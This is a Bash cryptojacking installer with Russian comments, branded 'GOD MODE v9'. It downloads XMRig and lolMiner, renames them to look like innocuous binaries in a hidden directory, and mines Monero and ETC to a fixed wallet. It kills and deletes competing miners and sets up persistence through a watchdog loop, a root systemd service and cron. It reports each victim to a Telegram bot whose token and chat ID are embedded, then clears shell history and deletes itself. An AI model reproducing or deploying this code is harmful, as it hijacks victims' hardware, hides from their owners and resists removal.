#!/bin/bash

# ============================================================
# |GOD MODE/ v9: ETERNAL WATCHDOG & STRIP-COMPONENTS FIX    |
# |      BASED ON YOUR SNIPPET // SELF-HEALING SYSTEM       |
# ============================================================

# [ ⚙️ КОНФИГУРАЦИЯ БОГА ]
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

# [ ПУЛЫ ]
POOL_CPU="xmr.kryptex.network:7777"
POOL_GPU="etc.kryptex.network:7033"

# [ ПОРТЫ ДЛЯ API (ЧТОБЫ WATCHDOG ВИДЕЛ ИХ) ]
PORT_CPU=16000
PORT_GPU=8088

# [ ДИРЕКТОРИЯ ]
if [ "$(id -u)" -eq 0 ]; then
    BASE_DIR="/usr/local/bin/.connfy-core"
else
    BASE_DIR="$HOME/.connfy-core"
fi
mkdir -p "$BASE_DIR"

# Имена
BIN_CPU="connfy_manager" 
BIN_GPU="connfy_render"

# ----------------------------------------------------
# [ ФАЗА 1: ГЕНЕРАЦИЯ ID ]
# ----------------------------------------------------
get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    local safe_ip=$(echo "$ip" | tr -d '.') 
    [ -z "$safe_ip" ] && safe_ip="999999"
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)

# ----------------------------------------------------
# [ ФАЗА 2: ЗАЧИСТКА (EXTERMINATE) ]
# ----------------------------------------------------
kill_competitors() {
    echo "💀 KILLING COMPETITORS..."
    TARGETS=("rigel" "t-rex" "nbminer" "xmrig" "lolminer" "gminer" "minerd")
    for target in "${TARGETS[@]}"; do
        pkill -9 -f "$target" >/dev/null 2>&1
        # Выжигаем папки, если найдем
        PIDS=$(pgrep -f "$target")
        for pid in $PIDS; do
            DIR=$(readlink -f "/proc/$pid/exe" 2>/dev/null | xargs dirname)
            if [[ "$DIR" != "/" && "$DIR" != "/bin" ]]; then rm -rf "$DIR"; fi
            kill -9 "$pid"
        done
    done
    # Убиваем свои старые копии, чтобы обновить конфиг
    pkill -f "$BIN_CPU"
    pkill -f "$BIN_GPU"
    pkill -f "watchdog_loop"
}
kill_competitors

# ----------------------------------------------------
# [ ФАЗА 3: УСТАНОВКА (ТВОЙ МЕТОД) ]
# ----------------------------------------------------
cd "$BASE_DIR" || exit

install_miners() {
    echo "[+] Installing Miners..."

    # --- CPU (XMRig) ---
    if [ ! -f "$BIN_CPU" ]; then
        curl -L -k -s -o cpu.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
        tar -xf cpu.tar.gz
        mv xmrig*/xmrig ./"$BIN_CPU"
        chmod +x ./"$BIN_CPU"
        rm -rf cpu.tar.gz xmrig*
    fi

    # --- GPU (lolMiner) - ИСПРАВЛЕННЫЙ МЕТОД ---
    # Используем --strip-components=1, так как внутри архива папка
    if [ ! -f "$BIN_GPU" ]; then
        echo "[+] Fetching lolMiner..."
        curl -L -k -s -o gpu.tar.gz "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"
        
        # Создаем временную папку для распаковки
        mkdir -p gpu_tmp
        tar -xzf gpu.tar.gz -C gpu_tmp --strip-components=1
        
        # Переносим бинарник
        mv gpu_tmp/lolMiner ./"$BIN_GPU"
        chmod +x ./"$BIN_GPU"
        
        # Чистим
        rm -rf gpu.tar.gz gpu_tmp
    fi
}
install_miners

# ... (начало скрипта и загрузка файлов без изменений) ...

# ----------------------------------------------------
# [ ИСПРАВЛЕННАЯ ЛОГИКА ЗАПУСКА ]
# ----------------------------------------------------

# Функция запуска без лишнего мусора
start_cpu() {
    # Используем pidof -x для точного поиска процесса по имени бинарника
    if ! pidof -x "$BIN_CPU" > /dev/null; then
        echo "[+] Starting CPU..."
        # Убрали --background. nohup + & достаточно.
        nohup ./$BIN_CPU \
            -o $POOL_CPU -u $WORKER -p x \
            --cpu-priority 5 \
            --http-enabled --http-host 127.0.0.1 --http-port $PORT_CPU \
            --donate-level 1 \
            > /dev/null 2>&1 &
    fi
}

start_gpu() {
    if [ -f "./$BIN_GPU" ]; then
        if ! pidof -x "$BIN_GPU" > /dev/null; then
            echo "[+] Starting GPU..."
            # Аналогично, чистый запуск в фоне
            nohup ./$BIN_GPU \
                --algo ETCHASH \
                --pool $POOL_GPU --user $WORKER \
                --ethstratum ETCPROXY \
                --apihost 127.0.0.1 --apiport $PORT_GPU \
                --nocolor --watchdog exit \
                > /dev/null 2>&1 &
        fi
    fi
}

# ----------------------------------------------------
# [ ГЕНЕРАЦИЯ ВЕЧНОГО WATCHDOG ]
# ----------------------------------------------------
# Мы записываем этот скрипт на диск. Установщик удалит себя, но ЭТОТ файл останется.

cat <<EOF > watchdog.sh
#!/bin/bash

# Переходим в рабочую папку, чтобы пути были корректны
cd "$BASE_DIR" || exit

while true; do
    # 1. ПРОВЕРКА CPU (Точное совпадение имени)
    if ! pidof -x "$BIN_CPU" > /dev/null; then
        echo "CPU dead, restarting..."
        nohup ./$BIN_CPU -o $POOL_CPU -u $WORKER -p x --cpu-priority 5 --http-enabled --http-host 127.0.0.1 --http-port $PORT_CPU --donate-level 1 >/dev/null 2>&1 &
    fi

    # 2. ПРОВЕРКА GPU
    if [ -f "./$BIN_GPU" ]; then
        # Проверка процесса
        if ! pidof -x "$BIN_GPU" > /dev/null; then
             echo "GPU dead, restarting..."
             nohup ./$BIN_GPU --algo ETCHASH --pool $POOL_GPU --user $WORKER --ethstratum ETCPROXY --apihost 127.0.0.1 --apiport $PORT_GPU --nocolor --watchdog exit >/dev/null 2>&1 &
        else
            # 3. ПРОВЕРКА ХЭШРЕЙТА (Только если процесс жив)
            # Ждем ответ 5 секунд, иначе считаем что завис
            STATS=\$(curl --max-time 5 -s http://127.0.0.1:$PORT_GPU/summary)
            
            # Парсим скорость (грубый, но надежный метод)
            HASHRATE=\$(echo "\$STATS" | grep -o '"Performance": *[0-9.]*' | awk '{print \$2}' | cut -d. -f1)
            
            # Если ответ пустой или 0 - убиваем
            if [ -n "\$HASHRATE" ] && [ "\$HASHRATE" -eq 0 ]; then
                echo "GPU Zero Hashrate. Kill."
                killall -9 "$BIN_GPU"
            fi
        fi
    fi

    sleep 60
done
EOF
chmod +x watchdog.sh

# ----------------------------------------------------
# [ ЗАПУСК ВАЧДОГА ]
# ----------------------------------------------------
# Сначала убиваем старые копии вачдога, чтобы не плодились
pkill -f "watchdog.sh"

# Запускаем новый. 
# ВНИМАНИЕ: nohup отвязывает процесс от текущего терминала.
# Даже если установщик завершится, этот процесс продолжит жить.
nohup ./watchdog.sh >/dev/null 2>&1 &

echo "[+] Eternal Watchdog deployed."

# Запускаем первый раз вручную, чтобы сразу пошло
start_cpu
start_gpu

# ----------------------------------------------------
# [ ФАЗА 6: ПЕРСИСТЕНТНОСТЬ ]
# ----------------------------------------------------
# Systemd (если есть)
if [ "$(id -u)" -eq 0 ] && [ -d "/run/systemd/system" ]; then
    cat <<EOF > /etc/systemd/system/connfy-wd.service
[Unit]
Description=Connfy Watchdog
After=network.target
[Service]
ExecStart=$BASE_DIR/watchdog.sh
Restart=always
User=root
[Install]
WantedBy=multi-user.target
EOF
    systemctl enable connfy-wd >/dev/null 2>&1
    systemctl start connfy-wd
fi

# Cron (всегда)
if command -v crontab >/dev/null 2>&1; then
    (crontab -l 2>/dev/null | grep -v "watchdog.sh"; echo "@reboot $BASE_DIR/watchdog.sh") | crontab -
    (crontab -l 2>/dev/null | grep -v "watchdog.sh"; echo "*/10 * * * * $BASE_DIR/watchdog.sh") | crontab -
fi

# ----------------------------------------------------
# [ ФИНАЛ ]
# ----------------------------------------------------
MSG="👹 <b>GOD MODE: ETERNAL WATCHDOG</b> %0A🆔 <b>ID:</b> $WORKER%0A🔧 <b>GPU Fix:</b> Applied%0A🛡 <b>Status:</b> Monitoring Active"
curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" > /dev/null 2>&1

history -c
rm -f "$0"
